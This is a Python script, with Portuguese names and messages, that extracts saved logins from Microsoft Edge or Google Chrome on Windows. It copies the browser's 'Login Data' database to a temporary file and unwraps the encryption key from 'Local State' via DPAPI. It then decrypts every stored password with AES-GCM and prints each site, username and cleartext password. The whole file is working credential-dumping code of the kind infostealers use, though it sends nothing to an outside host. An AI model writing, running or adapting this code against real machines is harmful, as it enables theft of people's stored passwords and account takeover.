import os
import shutil
import sqlite3
import win32crypt
import base64
import json
from Crypto.Cipher import AES
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from datetime import datetime
from pathlib import Path

def get_user_data_path(browser='Edge'):
    user = os.getenv("USERNAME")
    if browser == 'Edge':
        return f"C:/Users/{user}/AppData/Local/Microsoft/Edge/User Data/Default"
    elif browser == 'Chrome':
        return f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Default"
    else:
        raise ValueError("Navegador não suportado.")

def get_encryption_key(browser='Edge'):
    user = os.getenv("USERNAME")
    if browser == 'Edge':
        local_state_path = f"C:/Users/{user}/AppData/Local/Microsoft/Edge/User Data/Local State"
    elif browser == 'Chrome':
        local_state_path = f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Local State"
    else:
        raise ValueError("Navegador não suportado.")

    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.load(file)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key

def descriptografar_senha(senha_encriptada, chave):
    try:
        if senha_encriptada.startswith(b'v10') or senha_encriptada.startswith(b'v11'):
            senha_encriptada = senha_encriptada[3:]
            iv = senha_encriptada[:12]
            payload = senha_encriptada[12:]
            aesgcm = AESGCM(chave)
            senha = aesgcm.decrypt(iv, payload, None)
            return senha.decode()
        else:
            senha = win32crypt.CryptUnprotectData(senha_encriptada, None, None, None, 0)[1]
            return senha.decode()
    except Exception as e:
        print(f"Erro ao descriptografar a senha: {e}")
        return None

def extrair_logins(browser='Edge'):
    user = os.getenv("USERNAME")
    print(f"Logins encontrados no {browser} para o usuário {user}:\n")

    user_data_path = get_user_data_path(browser)
    login_data_path = os.path.join(user_data_path, "Login Data")
    login_data_temp = os.path.join(os.getenv("TEMP"), "Loginvault.db")
    shutil.copy2(login_data_path, login_data_temp)

    key = get_encryption_key(browser)

    conn = sqlite3.connect(login_data_temp)
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            site = row[0]
            usuario = row[1]
            senha_encriptada = row[2]
            if not senha_encriptada:
                continue

            senha = descriptografar_senha(senha_encriptada, key)
            if senha:
                print(f"Site: {site}")
                print(f"Usuário: {usuario}")
                print(f"Senha: {senha}")
                print("-" * 50)
            else:
                print(f"Erro ao descriptografar a senha para o site: {site}")
    finally:
        cursor.close()
        conn.close()
        os.remove(login_data_temp)

if __name__ == "__main__":
    extrair_logins(browser='Edge')
